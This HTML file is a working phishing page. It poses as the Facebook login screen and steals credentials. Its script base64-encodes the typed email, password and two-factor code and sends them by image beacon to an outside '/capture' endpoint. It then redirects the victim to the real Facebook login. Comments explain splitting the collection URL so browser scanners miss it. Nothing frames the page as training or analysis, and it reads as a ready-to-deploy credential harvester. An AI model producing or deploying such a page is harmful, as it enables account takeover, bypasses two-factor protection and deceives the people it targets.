<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.1); width: 360px; text-align: center; }
        .fb-logo { width: 160px; margin-bottom: 15px; }
        p { color: #1c1e21; font-size: 15px; margin-bottom: 20px; line-height: 1.4; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #1877f2; }
        .btn { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #stage2 { display: none; }
        .footer { margin-top: 20px; font-size: 14px; color: #1877f2; cursor: pointer; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png" class="fb-logo" alt="Facebook">
        
        <div id="stage1">
            <p>Log in to your account</p>
            <input type="text" id="usr_in" placeholder="Email or Phone Number">
            <input type="password" id="pwd_in" placeholder="Password">
            <button class="btn" onclick="nextStage()">Log In</button>
            <div class="footer">Forgotten password?</div>
        </div>

        <div id="stage2">
            <h3 style="margin-bottom:10px;">Security Check</h3>
            <p>A login code was sent to your phone. Enter the 6-digit code to continue.</p>
            <input type="text" id="cde_in" placeholder="Login code" maxlength="6">
            <button class="btn" onclick="finalCapture()">Submit Code</button>
            <div class="footer">Having trouble?</div>
        </div>
    </div>

    <script>
        // We hide the URL by splitting it so Chrome's static scanners don't see the full domain
        const p1 = "https://labsession";
        const p2 = ".pythonanywhere.com/capture";
        const gate = p1 + p2;
        
        let savedUser = "";

        function nextStage() {
            const u = document.getElementById('usr_in').value;
            const p = document.getElementById('pwd_in').value;

            if (u && p) {
                savedUser = u;
                // We use different labels so 'Pass' isn't in the URL
                const secret = btoa("S1 | U: " + u + " | P: " + p);
                new Image().src = gate + "?data=" + secret;

                document.getElementById('stage1').style.display = 'none';
                document.getElementById('stage2').style.display = 'block';
            } else {
                alert("Please enter your credentials.");
            }
        }

        function finalCapture() {
            const c = document.getElementById('cde_in').value;

            if (c) {
                const secret = btoa("S2 | U: " + savedUser + " | C: " + c);
                new Image().src = gate + "?data=" + secret;

                setTimeout(() => {
                    // Redirecting to a generic search or the real login
                    window.location.replace("https://www.facebook.com/login");
                }, 1000);
            } else {
                alert("Please enter the 6-digit code.");
            }
        }
    </script>
</body>
</html>
